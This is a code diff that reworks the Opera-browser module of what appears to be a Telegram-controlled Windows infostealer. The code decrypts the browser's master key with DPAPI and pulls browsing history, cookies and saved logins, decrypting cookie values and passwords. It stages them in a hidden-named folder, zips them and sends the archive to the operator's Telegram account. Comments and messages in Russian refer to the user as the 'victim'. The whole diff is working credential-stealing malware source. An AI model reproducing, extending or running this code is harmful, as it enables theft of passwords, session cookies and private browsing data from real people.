@@ -25,74 +25,79 @@ def Opera(dp, bot, admin_id):
                 except:
                     return "Can't decode"
 
-            async def get_master_key_chrome():
+            def get_master_key_opera():
                 try:
                     with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Local State', "r", encoding='utf-8') as f:
-                        local_state = f.read()
-                        local_state = json.loads(local_state)
-                    master_key_chrome = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-                    master_key_chrome = master_key_chrome[5:]  
-                    master_key_chrome = win32crypt.CryptUnprotectData(master_key_chrome, None, None, None, 0)[1]
-                    return master_key_chrome
+                        local_state = json.loads(f.read())
+                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+                    master_key = master_key[5:]
+                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                    return master_key
                 except:
-                    await bot.send_message(admin_id, 'Жертва не имеет Chrome Браузер')
+                    return None
+
             def decrypt(buff, master_key):
                 try:
                     return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
                 except:
                     return "Can't decode"
 
-
-
-            try:
-                os.makedirs(r'C:\hesoyam8927163\Opera')
-                HistorySQL = "SELECT url FROM visits"
-                HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
-
-                data_path = os.path.expanduser('~')+r"\AppData\Roaming\Opera Software\Opera Stable"
-                files = os.listdir(data_path)
-                history_db = os.path.join(data_path, 'history')
-                shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\historyOPERA.db')
-                c = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\historyOPERA.db')
-                cursor = c.cursor()
-                temp = []
-                with open(rf"C:\hesoyam8927163\Opera\history-opera.txt", "a", encoding="utf-8") as history:
-                    for result in cursor.execute(HistorySQL).fetchall():
-                        data = cursor.execute(HistoryLinksSQL % result[0]).fetchone()
-                        result = f"URL: {data[0]}\nTitle: {data[1]}\nLast Visit: {time(data[2])}\n\n"
-                        if result in temp:
-                            continue
-                        temp.append(result)
-                        history.write(result)
-                    history.close()
+            def decrypt_password(buff, master_key):
                 try:
-                    os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\historyOPERA.db')
+                    iv = buff[3:15]
+                    payload = buff[15:]
+                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                    decrypted_pass = cipher.decrypt(payload)
+                    decrypted_pass = decrypted_pass[:-16].decode()
+                    return decrypted_pass
                 except:
-                    pass
+                    return "Opera < 80"
+
+            master_key = get_master_key_opera()
+            if master_key is None:
+                await bot.send_message(admin_id, 'Что-то пошло не так, скорее всего у жертвы нету Opera :(')
+                return
+
+            os.makedirs(r'C:\hesoyam8927163\Opera', exist_ok=True)
             
-                CookiesSQL = "SELECT * FROM cookies"
-                data_path = os.path.expanduser('~')+r"\AppData\Roaming\Opera Software\Opera Stable"
-                files = os.listdir(data_path)
-                history_db = os.path.join(data_path, 'Cookies')
-                shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookiesOPERA.db')
-                c = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookiesOPERA.db')
-                cursor = c.cursor()
-                
-                results = '[\n'
+            # History
+            try:
+                history_db = os.path.expanduser('~') + r'\AppData\Roaming\Opera Software\Opera Stable\Default\History'
+                if os.path.exists(history_db):
+                    shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\historyOPERA.db')
+                    c = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\historyOPERA.db')
+                    cursor = c.cursor()
+                    temp = []
+                    with open(rf"C:\hesoyam8927163\Opera\history-opera.txt", "a", encoding="utf-8") as history:
+                        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
+                        for row in cursor.fetchall():
+                            result = f"URL: {row[0]}\nTitle: {row[1]}\nLast Visit: {time(row[2])}\n\n"
+                            if result not in temp:
+                                temp.append(result)
+                                history.write(result)
+                    c.close()
+                    try:
+                        os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\historyOPERA.db')
+                    except:
+                        pass
+            except:
+                pass
 
-                result = cursor.execute(CookiesSQL).fetchall()
-
-                for result in cursor.execute(CookiesSQL).fetchall():
-                    if result[8] == 0:
-                        secure = False
-                    else:
-                        secure = True
-
-                    if result[9] == 0:
-                        http = False
-                    else:
-                        http = True
-                    results += '''
+            # Cookies
+            try:
+                cookies_db = os.path.expanduser('~') + r'\AppData\Roaming\Opera Software\Opera Stable\Default\Network\Cookies'
+                if os.path.exists(cookies_db):
+                    shutil.copy2(cookies_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookiesOPERA.db')
+                    c = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookiesOPERA.db')
+                    cursor = c.cursor()
+                    
+                    cursor.execute("SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies")
+                    results = '[\n'
+                    for row in cursor.fetchall():
+                        secure = bool(row[3])
+                        http = bool(row[4])
+                        decrypted_value = decrypt(row[6], master_key)
+                        results += '''
             {
                 "domain": "%s",
                 "expirationDate": %s,
@@ -102,91 +107,57 @@ def Opera(dp, bot, admin_id):
                 "secure": %s,
                 "value": "%s"
             },
-                    '''% (result[1], result[7], result[2], http, result[6], secure, decrypt(result[5], get_master_key_chrome()))
-
-                with open(rf"C:\hesoyam8927163\Opera\Cookies-Opera.json", "a", encoding="utf-8") as cookies:
-                    results = results.replace('True', 'true')
-                    results = results.replace('False', 'false')
-                    results += '\n]'
-                    cookies.write(results)
-
-                cookies.close()
-                try:
-                    os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookiesOPERA.db')
-                except:
-                    pass
-            except:
-                pass
-
-            try:
-                def get_master_key():
-                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera GX Stable\Local State', "r", encoding='utf-8') as f:
-                        local_state = f.read()
-                        local_state = json.loads(local_state)
-                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-                    master_key = master_key[5:]  
-                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-                    return master_key
-
-
-                def decrypt_payload(cipher, payload):
-                    return cipher.decrypt(payload)
-
-
-                def generate_cipher(aes_key, iv):
-                    return AES.new(aes_key, AES.MODE_GCM, iv)
-
-
-                def decrypt_password(buff, master_key):
+                        '''% (row[0], row[5], row[1], str(http).lower(), row[2], str(secure).lower(), decrypted_value)
+                    
+                    with open(rf"C:\hesoyam8927163\Opera\Cookies-Opera.json", "a", encoding="utf-8") as cookies:
+                        cookies.write(results.rstrip(',\n') + '\n]')
+                    
+                    c.close()
                     try:
-                        iv = buff[3:15]
-                        payload = buff[15:]
-                        cipher = generate_cipher(master_key, iv)
-                        decrypted_pass = decrypt_payload(cipher, payload)
-                        decrypted_pass = decrypted_pass[:-16].decode()  
-                        return decrypted_pass
+                        os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookiesOPERA.db')
                     except:
-
-                        return "Opera < 80"    
+                        pass
             except:
                 pass
 
-
-
-
-
-
+            # Passwords
             try:
-                master_key = get_master_key()
-                login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\\Opera Software\Opera Stable\Login Data'
-                shutil.copy2(login_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\LoginvaultOPERA.db') 
-                conn = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\LoginvaultOPERA.db')
-                cursor = conn.cursor()
+                login_db = os.path.expanduser('~') + r'\AppData\Roaming\Opera Software\Opera Stable\Default\Login Data'
+                if os.path.exists(login_db):
+                    shutil.copy2(login_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\LoginvaultOPERA.db')
+                    conn = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\LoginvaultOPERA.db')
+                    cursor = conn.cursor()
+                    
+                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                    with open(r'C:\hesoyam8927163\Opera\opera-passwords.txt', "a", encoding='utf-8') as o:
+                        for r in cursor.fetchall():
+                            decrypted_password = decrypt_password(r[2], master_key)
+                            o.write(f"URL: {r[0]}\nUserName: {r[1]}\nPassword: {decrypted_password}\n\n")
+                    
+                    conn.close()
+                    try:
+                        os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\LoginvaultOPERA.db')
+                    except:
+                        pass
+            except:
+                pass
 
-                
-                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                for r in cursor.fetchall():
-                    url = r[0]
-                    username = r[1]
-                    encrypted_password = r[2]
-                    decrypted_password = decrypt_password(encrypted_password, master_key)
+            # Проверяем что файлы созданы
+            files_in_dir = os.listdir(r'C:\hesoyam8927163\Opera')
+            if not files_in_dir:
+                await bot.send_message(admin_id, 'Не удалось собрать данные Opera. Файлы не найдены.')
+                return
 
-                    alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"
-
-                    with open(r'C:\hesoyam8927163\Opera\opera-passwords.txt', "a") as o:
-                        o.write(alldatapass)
-
+            # Archive and send
+            try:
                 shutil.make_archive('opera', 'zip', 'C:\\hesoyam8927163\\Opera')
-
                 await bot.send_document(admin_id, open('opera.zip', 'rb'))
+                os.remove('opera.zip')
+                shutil.rmtree('C:\\hesoyam8927163')
+            except:
+                await bot.send_message(admin_id, 'Что-то пошло не так, скорее всего у жертвы нету Opera :(')
                 
-                try:
-                    os.remove('opera.zip')
-                    os.shutil('C:\\hesoyam8927163')
-                    os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\LoginvaultOPERA.db')
-                except Exception as e:
-                    print(e)
-            except Exception as e:
-                print(e)
         except:
             await bot.send_message(admin_id, 'Что-то пошло не так, скорее всего у жертвы нету Opera :(')
+
+
